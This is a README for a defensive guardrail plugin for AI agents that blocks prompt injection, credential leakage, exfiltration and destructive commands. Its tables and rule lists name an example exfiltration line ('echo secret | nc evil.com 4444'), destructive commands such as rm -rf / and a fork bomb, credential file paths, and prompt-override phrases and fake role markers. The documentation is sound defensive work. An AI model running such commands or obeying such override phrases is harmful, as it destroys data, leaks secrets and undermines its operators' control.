# Guardrail Middleware

**Hooks:** `before_tool_call` (L2) + `before_message_write` (L3) | **Version:** 3.1.0

Multi-layer security middleware that detects and blocks prompt injection, PII leakage, credential exposure, data exfiltration, destructive commands, and role impersonation attacks. Enforces security at two levels: before tool execution (L2) and before content enters the conversation transcript (L3).

## Defense Layers

```
User / Tool / Web / DB / Email / Shell
              │
              ▼
┌──────────────────────────────────────┐
│  L2: before_tool_call                │  Blocks BEFORE tool executes
│  ├─ Sensitive Path Blocklist         │  .ssh, .env, .aws/credentials + symlink resolve
│  ├─ Network Egress Control           │  curl -d, domain allowlist, SSRF (IPv4+IPv6)
│  ├─ Destructive Command Blocker      │  rm -rf, DROP TABLE, git push --force
│  ├─ Shell Indirection Detection      │  eval, bash -c, $() substitution, $VAR expansion
│  ├─ Pre-read File Scanner            │  Read file → scan → block if dangerous
│  └─ Parameter Scan (regex engine)    │  Prompt injection, PII in tool params
└──────────────────────────────────────┘
              │
              ▼  (tool executes)
              │
              ▼
┌──────────────────────────────────────┐
│  L3: before_message_write            │  Scans BEFORE transcript write
│  ├─ Canary / Leakback Detection      │  Re-detects previously redacted content
│  ├─ Role Impersonation Detection     │  ChatML, [SYSTEM], fake role markers
│  └─ Full Guardrail Scan (regex)      │  All rules across all content
└──────────────────────────────────────┘
              │
              ▼
        Conversation Transcript (JSONL)
```

**L2** prevents dangerous tools from executing. **L3** catches anything that slips through in the tool's output.

## Architecture

```
src/middlewares/guardrail/
├── index.ts                          # Public barrel — re-exports all modules
├── GuardrailScanner.ts               # Orchestrator: dispatches to scanners, fail-open
├── ConfidenceFilter.ts               # HIGH = instant, MEDIUM = needs 2+ categories OR 2+ rules in same category
├── types.ts                          # TypeScript interfaces (config, rules, detections, guards)
│
├── guards/                           # Fast-path security checks (L2 + L3)
│   ├── index.ts                      # Guard exports
│   ├── sensitive-paths.ts            # L2: Block access to .ssh, .env, credentials, keys
│   ├── egress-control.ts             # L2: Block data exfiltration, domain allowlist, SSRF
│   ├── destructive-commands.ts       # L2: Block rm -rf, DROP TABLE, format, fork bombs
│   ├── role-impersonation.ts         # L3: Detect ChatML, fake [SYSTEM], role markers
│   └── canary-tracker.ts             # L3: Track redacted content, re-redact on leakback
│
├── normalizers/
│   └── UnicodeNormalizer.ts          # NFKC + homoglyph map + zero-width removal
│
├── analyzers/
│   ├── EntropyAnalyzer.ts            # Shannon entropy calculation
│   └── DetectionFactory.ts           # Detection builder with safe preview truncation
│
├── scanners/
│   ├── RegexScanner.ts               # Regex-type rule matching (50ms timeout, fail-closed on ReDoS)
│   ├── PrefixScanner.ts              # Prefix-type (AKIA, sk-, hf_, xox)
│   ├── HeuristicScanner.ts           # Entropy-based secret detection (>= 4.0)
│
├── rules/
│   ├── index.ts                      # Aggregates all rule categories
│   ├── prompt-injection.rules.ts     # 18 rules
│   ├── pii.rules.ts                  # 28 rules (incl. AWS secret key)
│   └── suspicious.rules.ts           # 8 rules
│
├── storage/
│   └── ConfigStore.ts                # Persistent config (~/.openclaw/sapience-guardrail/)
│
├── cli/
│   ├── status.ts                     # sai guardrail status
│   ├── list.ts                       # sai guardrail list [category]
│   ├── toggle.ts                     # sai guardrail toggle enable|disable|dry-run
│   ├── rule-toggle.ts                # sai guardrail rule-toggle <name>
│   ├── rule-action.ts                # sai guardrail rule-action <name> <action>
│   ├── rule-add.ts                   # sai guardrail rule-add <name> <category>
│   ├── rule-remove.ts                # sai guardrail rule-rm <name>
│   ├── config-get.ts                 # sai guardrail config
│   ├── reset.ts                      # sai guardrail reset
│   ├── egress.ts                     # sai guardrail egress status|toggle|allow|remove|list
│   ├── paths.ts                      # sai guardrail paths status|toggle|block|allow|list
│   └── destructive.ts               # sai guardrail destructive status|toggle|list|add|remove
│
├── utils/
│   └── Logger.ts                     # Data directory + logger
│
└── test/
    ├── test-tier1-features.js        # 46 tests
    ├── test-guardrail-core.js        # 11 tests
    ├── test-pii-detection.js         # 8 tests
    └── test-advanced-detection.js    # Multi-pattern scenarios
```

### Plugin Wiring (src/plugin/)

The plugin layer is a thin bridge between OpenClaw hooks and the guardrail engine:

| File | Hook | Role |
|------|------|------|
| `guardrail-interceptor.ts` | `before_tool_call` | Runs L2 guards + pre-read + param scan |
| `guardrail-write-scanner.ts` | `before_message_write` | Runs L3 guards + full content scan |

## L2 Guards (before_tool_call)

### 1. Sensitive Path Blocklist

Blocks tool calls targeting sensitive file paths **before the file is opened**. Zero false positives — pure path matching.

**49 default patterns** covering:

| Category | Examples |
|----------|----------|
| SSH keys | `~/.ssh/*`, `~/.ssh` |
| Cloud credentials | `~/.aws/credentials`, `~/.config/gcloud/**`, `~/.azure/**` |
| Environment files | `.env`, `.env.*`, `.env.local`, `.env.production` |
| Git/Auth | `.git-credentials`, `.netrc`, `.npmrc`, `.pypirc` |
| Private keys | `*.pem`, `*.key`, `*.p12`, `*.pfx`, `*.jks` |
| Credential files | `credentials.json`, `service-account*.json`, `secrets.json` |
| OS secrets | `/etc/shadow`, `/etc/passwd`, `/etc/sudoers` |
| History files | `.bash_history`, `.zsh_history`, `.node_repl_history` |
| Database files | `*.sqlite`, `*.sqlite3`, `*.db` |
| OpenClaw config | `~/.openclaw/openclaw.json` (contains auth tokens) |

**Allowlist overrides** (3 defaults): `.env.example`, `.env.sample`, `.env.template`

```bash
sai guardrail paths status              # Show blocklist status
sai guardrail paths list                # List all blocked/allowed patterns
sai guardrail paths block "**/.secret"  # Add custom pattern
sai guardrail paths allow "**/.env.dev" # Add allowlist override
sai guardrail paths remove <pattern>    # Remove a pattern
sai guardrail paths toggle              # Enable/disable
```

### 2. Network Egress Control

Detects and blocks network commands in shell/exec tools. Prevents data exfiltration with three rules:

**Rule A — Block data-sending commands (highest priority)**

Detects commands actively **sending data outbound**:
- `curl -d`, `--data`, `--upload`, `-F`, `-T`, `--json`, `-X DELETE`
- `wget --post-data`, `--post-file`
- `nc` / `socat` with piped input (`echo secret | nc evil.com 4444`)
- `scp` / `rsync` local-to-remote
- Language one-liners: `python -c "requests.post(...)"`, `node -e "fetch(...)"`

**Rule B — Domain allowlist (default-deny)**

25 default allowed domains (tightened — no broad wildcards):

| Category | Domains |
|----------|---------|
| Package registries | `registry.npmjs.org`, `pypi.org`, `rubygems.org`, `crates.io`, `pkg.go.dev` |
| Code hosting | `github.com`, `api.github.com`, `raw.githubusercontent.com`, `codeload.github.com`, `gitlab.com`, `bitbucket.org` |
| AI APIs | `api.openai.com`, `api.anthropic.com` |
| AWS (specific) | `s3.amazonaws.com`, `sts.amazonaws.com`, `ecr.amazonaws.com`, `lambda.amazonaws.com` |
| CDNs / infra | `*.cloudflare.com`, `*.googleapis.com` |

Unlisted domains are **blocked by default**. Supports wildcard: `*.gitlab.com`.

> **Security note:** Broad wildcards like `*.github.com` and `*.amazonaws.com` were removed — they allowed attacker-controlled subdomains (GitHub Pages, arbitrary S3 buckets) to receive exfiltrated data.

**Rule C — Private/internal IP blocking (SSRF prevention)**

Blocks connections to private and internal addresses across both IPv4 and IPv6:

| Range | Description |
|-------|-------------|
| `127.0.0.0/8` | IPv4 loopback |
| `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` | IPv4 private |
| `169.254.0.0/16`, `169.254.169.254` | Link-local + cloud metadata |
| `::1` | IPv6 loopback |
| `fe80::/10` | IPv6 link-local |
| `fc00::/7` (incl. `fd00::/8`) | IPv6 unique local |
| `::ffff:127.0.0.1` etc. | IPv4-mapped IPv6 |
| `localhost`, `metadata.google.internal` | Named endpoints |

```bash
sai guardrail egress status               # Show egress policy
sai guardrail egress list                  # List allowed domains
sai guardrail egress allow api.example.com # Add domain
sai guardrail egress remove <domain>       # Remove domain
sai guardrail egress data-sending on|off   # Toggle data-sending block
sai guardrail egress private-ips on|off    # Toggle private IP block
sai guardrail egress toggle                # Enable/disable
```

### 3. Destructive Command Blocker

Hard-blocks dangerous shell commands. 21 built-in patterns across 7 categories:

| Category | Patterns | Severity |
|----------|----------|----------|
| Filesystem destruction | `rm -rf /`, `del /s /q`, `format C:` | CRITICAL |
| Disk operations | `dd of=/dev/`, `mkfs`, `fdisk` | CRITICAL |
| Database destruction | `DROP DATABASE`, `DROP TABLE`, `TRUNCATE`, `DELETE FROM` (no WHERE) | CRITICAL/HIGH |
| Git destructive | `git push --force main`, `git reset --hard`, `git clean -f` | CRITICAL/HIGH |
| Permission escalation | `chmod 777`, `chmod -R /` | HIGH/CRITICAL |
| Service disruption | `shutdown`, `reboot`, `killall -9` | CRITICAL/HIGH |
| Resource exhaustion | Fork bombs (`:(){:|:&};:`) | CRITICAL |

Supports **custom regex patterns** for project-specific commands.

```bash
sai guardrail destructive status           # Show blocker status
sai guardrail destructive list             # List all 21 built-in + custom patterns
sai guardrail destructive add "my_pattern" # Add custom regex
sai guardrail destructive remove "pattern" # Remove custom pattern
sai guardrail destructive toggle           # Enable/disable
```

### 4. Pre-read File Scanner

Reads file content **before the tool executes**, scans it, and blocks if dangerous. Extracts file paths from:

- Direct params: `path`, `file_path`, `filePath`, `filename`, etc.
- Shell commands: `cat`, `type`, `head`, `tail`, `Get-Content`, `bat`, etc.
- Input redirection: `< file.txt`
- Generic catch-all: any quoted/unquoted string that exists as a file on disk

Skips binary files, files > 1MB. Fail-open on read errors.

### 5. Parameter Scan (Regex Engine)

Extracts all string params from tool calls and runs the full 54-rule guardrail scan on them. Covers command strings, file paths, URLs, request bodies, and any other string parameter.

## L3 Guards (before_message_write)

### 1. Canary / Leakback Detection

Tracks content that was previously redacted and detects if it reappears in later messages.

**How it works:**
1. When the guardrail redacts or warns on content, it hashes the original matched text (SHA-256, whitespace-normalized) and stores it in a ring buffer (500 entries max)
2. Canaries are registered for **all** detection levels: BLOCK, WARN, and role impersonation neutralizations
3. On every subsequent message, sliding window comparison checks if any canary appears
4. If found, the content is re-redacted with `[REDACTED:canary:<category>]`

Prevents the "redact once, leak on retry" pattern — where the LLM regurgitates redacted content from its context window, or a second tool fetch returns the same data. Whitespace normalization prevents trivial evasion by inserting extra spaces/tabs.

### 2. Role Impersonation Detection

Detects tool results and messages trying to impersonate system prompts or conversation turns. 17 patterns across 7 categories:

| Category | Patterns | Severity |
|----------|----------|----------|
| ChatML injection | `<\|im_start\|>` + any role, `<\|im_end\|>`, unicode-escaped variants | CRITICAL/HIGH |
| Llama markers | `[INST]`, `<<SYS>>` | HIGH/CRITICAL |
| Fake system | `[SYSTEM]:`, `<system>`, `system prompt:` | CRITICAL/HIGH |
| Fake roles | `User: ignore/stop/don't/reset...`, `Assistant: I will/Sure/Yes...` | CRITICAL/HIGH |
| Meta-instruction | `NEW/IMPORTANT INSTRUCTIONS:`, `--- END OF PROMPT ---` | CRITICAL/HIGH |
| Message format | `{"role": "system", "content": ...}` | HIGH |
| Turn markers | `Human: ... \n Assistant:` | HIGH |
| Tool output | `<tool_result>`, `<function_call>`, `<function_response>` | HIGH |

Detected markers are **neutralized** — replaced with `[NEUTRALIZED:<pattern_name>]` so the LLM sees them as data, not as conversation structure.

### 3. Full Guardrail Scan

Runs the complete 54-rule detection engine on every message before it enters the transcript. Content >512KB is scanned via head+tail chunking (not skipped). Catches prompt injection, PII, credentials, and suspicious patterns from ANY content vector — shell output, web fetches, DB results, email bodies, file content.

## Detection Engine

### Rule Types

| Type | Mechanism | Example |
|------|-----------|---------|
| **regex** | Global regex pattern matching | `ignore\s+instructions` |
| **prefix** | Known prefix + 16+ alphanumeric chars | `AKIA`, `sk-`, `hf_`, `xox` |
| **heuristic** | Shannon entropy >= 4.0 on 20+ char tokens | Random-looking strings |

### Confidence Scoring

- **`high`** (default) — Single match triggers detection immediately
- **`medium`** — Fires if 2+ distinct rule categories have detections in the same message, OR if 2+ distinct rules within the same category fire (prevents same-category attacks from cancelling each other out)

### Unicode Normalization

Prevents bypass attacks:
- **NFKC normalization** — Fullwidth `Ｉｇｎｏｒｅ` → `Ignore`
- **Homoglyph mapping** — Cyrillic `іgnore` → Latin `ignore`
- **Zero-width removal** — `ignore\u200B instructions` → `ignore instructions`
- **Soft hyphen removal** — `ig\u00ADnore` → `ignore`

### Fail-to-Defaults Design

The guardrail never crashes the agent, but critical paths fail closed:
- Config load failure → **hardcoded defaults** used (not fail-open empty) with full schema validation
- Config tampering → all fields validated (types, ranges, regex compilation), invalid values replaced with defaults
- Scanner crash → allowed through with warning
- Individual rule/guard failure → skipped, others continue
- **Regex timeout** (50ms) → treated as detection (fail-closed, prevents ReDoS bypass)
- **Regex compile error** → treated as detection (fail-closed)

### Security Hardening (v3.1.0)

Fixes from comprehensive security audit:

| Fix | Loophole | Description |
|-----|----------|-------------|
| Config validation | C1, C2 | Full schema validation on load; fail-to-defaults instead of fail-open |
| Symlink resolution | C5 | `fs.realpathSync()` before path blocklist check |
| Shell indirection | C3 | Detects `eval`, `bash -c`, `$(...)`, backticks, suspicious `$VAR` names → ESCALATE |
| Regex timeout | C4 | 50ms deadline per regex; timeout = synthetic detection (fail-closed) |
| Canary improvements | H1, H5 | Registered for BLOCK + WARN + role impersonation; whitespace-normalized hashing |
| IPv6 SSRF | H2 | Full IPv6 support: `::1`, `fe80::/10`, `fc00::/7`, `::ffff:` mapped |
| Confidence filter | H3 | MEDIUM rules fire when 2+ rules match in same category (not just cross-category) |
| Large content chunking | H6 | >512KB scanned via head(512KB) + tail(128KB) instead of skipped |
| AWS secret keys | H8 | Detects `aws_secret_access_key=...` (40-char base64 after label) |
| Role impersonation gaps | H4 | ChatML catches any role, unicode escapes, expanded keywords, `<tool_result>` tags |
| Domain allowlist | M5 | Removed `*.github.com` / `*.amazonaws.com`; specific subdomains only |
| DELETE method | M8 | `-X DELETE` flagged as data-sending in egress control |

## Rules (54 total)

### Prompt Injection (18 rules)

**Instruction Override:** `ignore_instructions`, `forget_instructions`, `disregard_instructions`, `new_instructions`, `you_are_now`

**Role Assumption:** `act_as` (medium), `roleplay_as`, `pretend_to_be`

**System Override:** `system_markers` ([SYSTEM], [ADMIN], [ROOT]), `fake_system_message`

**Jailbreak:** `jailbreak_keywords`, `reverse_instructions`, `do_opposite`

**Concealment:** `concealment_directive`, `hide_instructions`

**Data Exfiltration:** `exfiltration_url` (CRITICAL), `exfiltration_curl`, `pipe_exfiltration` (CRITICAL)

**Task Hijacking:** `task_hijacking` (medium)

### PII & Credentials (24 rules)

**Standard PII:** `phone_number`, `email_address`, `credit_card` (CRITICAL), `ssn` (CRITICAL), `iban`, `ip_address` (medium)

**Secret Keys (25+ patterns):** `aws_key`, `aws_secret_key` (CRITICAL — detects secret access keys by label), `openai_key`, `anthropic_key`, `huggingface_key`, `slack_token`, `github_token`, `stripe_key`, `sendgrid_key`, `npm_token`, `gcp_key`, `slack_webhook`, `private_key_header` (CRITICAL), `jwt_token`, `bearer_token`, `db_connection_string` (CRITICAL), `generic_api_key`, `high_entropy_secret`

### Suspicious Patterns (8 rules)

`multiple_exclamations`, `multiple_questions`, `base64_hint`, `sql_injection`, `xss_attempt`, `command_injection`, `sensitive_file_path`, `destructive_command`

## Configuration

### Storage

Persisted at: `~/.openclaw/sapience-guardrail/config.json`

### Config Structure

```json
{
  "version": "3.1.0",
  "enabled": true,
  "dryRunMode": false,
  "unicodeNormalization": true,
  "entropyThreshold": 4.0,
  "rules": {
    "promptInjection": [...],
    "pii": [...],
    "suspicious": [...]
  },
  "sensitivePaths": {
    "enabled": true,
    "action": "BLOCK",
    "blockedPaths": ["**/.ssh/*", "**/.env", ...],
    "allowedPaths": ["**/.env.example", ...]
  },
  "egressControl": {
    "enabled": true,
    "defaultAction": "BLOCK",
    "allowedDomains": ["github.com", "api.github.com", "s3.amazonaws.com", ...],
    "blockDataSending": true,
    "blockPrivateIPs": true
  },
  "destructiveCommands": {
    "enabled": true,
    "action": "BLOCK",
    "customPatterns": []
  }
}
```

## CLI Commands

### Core

```bash
sai guardrail status                    # Full status with L2/L3 guard info
sai guardrail list [category]           # List rules (promptInjection|pii|suspicious|all)
sai guardrail config                    # Print config path + full JSON
sai guardrail toggle enable|disable     # Enable/disable guardrail
sai guardrail toggle dry-run            # Toggle dry-run mode
sai guardrail reset                     # Factory defaults
```

### Rule Management

```bash
sai guardrail rule-toggle <name> [true|false]     # Toggle a rule on/off
sai guardrail rule-action <name> BLOCK|WARN|LOG   # Change a rule's action
sai guardrail rule-add <name> <category> [opts]   # Add custom rule
sai guardrail rule-rm <name>                       # Remove a rule
```

### Egress Control

```bash
sai guardrail egress status               # Show egress policy
sai guardrail egress toggle               # Enable/disable
sai guardrail egress list                  # List allowed domains
sai guardrail egress allow <domain>        # Add to allowlist
sai guardrail egress remove <domain>       # Remove from allowlist
sai guardrail egress data-sending on|off   # Toggle data-sending block
sai guardrail egress private-ips on|off    # Toggle private IP block
```

### Sensitive Paths

```bash
sai guardrail paths status                # Show blocklist status
sai guardrail paths toggle                # Enable/disable
sai guardrail paths list                  # List blocked + allowed patterns
sai guardrail paths block <pattern>       # Add to blocklist
sai guardrail paths allow <pattern>       # Add to allowlist (overrides)
sai guardrail paths remove <pattern>      # Remove from either list
```

### Destructive Commands

```bash
sai guardrail destructive status          # Show blocker status
sai guardrail destructive toggle          # Enable/disable
sai guardrail destructive list            # List all 21 built-in + custom patterns
sai guardrail destructive add <regex>     # Add custom pattern
sai guardrail destructive remove <regex>  # Remove custom pattern
```

## Testing

```bash
node src/middlewares/guardrail/test/test-tier1-features.js    # 46 tests
node src/middlewares/guardrail/test/test-guardrail-core.js     # 11 tests
node src/middlewares/guardrail/test/test-pii-detection.js      # 8 tests
```

## Runtime

- **Source:** `src/middlewares/guardrail/`
- **Plugin wiring:** `src/plugin/guardrail-interceptor.ts` + `src/plugin/guardrail-write-scanner.ts`
- **Config:** `~/.openclaw/sapience-guardrail/config.json`
- **Hooks:** Registered via OpenClaw plugin API (`api.on(...)`)

## Roadmap

- [x] Multi-layer defense (L2 before_tool_call + L3 before_message_write)
- [x] Sensitive path blocklist (49 patterns, allowlist overrides, symlink resolution)
- [x] Network egress control (25 allowed domains, data-sending block, IPv4+IPv6 SSRF prevention)
- [x] Destructive command blocker (21 built-in patterns + custom)
- [x] Shell indirection detection (eval, bash -c, $() substitution, $VAR expansion)
- [x] Role impersonation detection (17 patterns, ChatML, fake roles, tool output tags)
- [x] Canary / leakback detection (SHA-256 ring buffer, whitespace-normalized, BLOCK+WARN+impersonation)
- [x] Pre-read file scanning (generic, covers all tools)
- [x] 50 detection rules (regex, prefix, heuristic) — incl. AWS secret keys
- [x] Unicode normalization (NFKC + homoglyphs + zero-width)
- [x] Confidence scoring (HIGH / MEDIUM with same-category corroboration)
- [x] Full CLI management for all guards and rules
- [x] Fail-to-defaults config loading with full schema validation
- [x] Regex timeout (50ms, fail-closed) — ReDoS-safe
- [x] Large content chunked scanning (head+tail, no skip)
- [x] Audit trail via DecisionLog
- [x] Security audit (10 CRITICAL/HIGH + 2 MEDIUM fixes applied)
- [ ] Session threat scoring — cumulative risk per session
- [ ] Multi-turn injection detection — sliding window across messages
- [ ] Per-channel / per-tool policy overrides
- [ ] Prompt inoculation — inject defensive prefix into system prompt

## Requirements

- Node.js 18+
- OpenClaw 2026.3+
- fs-extra
